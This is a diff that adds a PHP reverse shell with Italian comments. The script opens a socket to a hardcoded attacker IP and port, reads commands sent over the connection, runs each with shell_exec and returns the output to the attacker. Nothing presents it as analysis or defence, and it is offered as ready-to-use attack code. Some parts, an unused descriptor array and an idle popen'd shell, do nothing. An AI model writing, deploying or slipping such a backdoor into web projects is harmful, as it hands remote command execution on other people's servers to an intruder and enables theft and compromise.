@@ -1,0 +1,38 @@
+<?php
+    set_time_limit(0);
+    $ip = '192.168.50.100';  // Inserisci l'indirizzo IP del tuo attaccante
+    $port = 1024;            // Inserisci la porta su cui il tuo attaccante è in ascolto
+
+    // Crea il socket per connettersi all'attaccante
+    $sock = fsockopen($ip, $port);
+    if (!$sock) {
+        exit("Impossibile connettersi\n");
+    }
+
+    // Crea il processo della shell (usiamo popen per eseguire la shell)
+    $descriptorspec = array(
+        0 => array("socket", $sock, "r"),  // stdin (comandi ricevuti dall'attaccante)
+        1 => array("socket", $sock, "w"),  // stdout (output del comando da restituire all'attaccante)
+        2 => array("socket", $sock, "w")   // stderr (errori da restituire all'attaccante)
+    );
+
+    $process = popen('/bin/sh', 'r');  // Usa popen per avviare la shell
+
+    if ($process) {
+        while ($cmd = fgets($sock)) {  // Legge i comandi inviati dall'attaccante
+            $cmd = trim($cmd);
+            if ($cmd != '') {
+                // Esegui il comando ricevuto e invia l'output al socket
+                $output = shell_exec($cmd);
+                fwrite($sock, $output);  // Invia l'output del comando all'attaccante
+                fflush($sock);           // Assicura che l'output venga inviato immediatamente
+            }
+        }
+
+        fclose($sock);
+        pclose($process);
+    } else {
+        exit("Errore nell'avviare la shell\n");
+    }
+?>
+
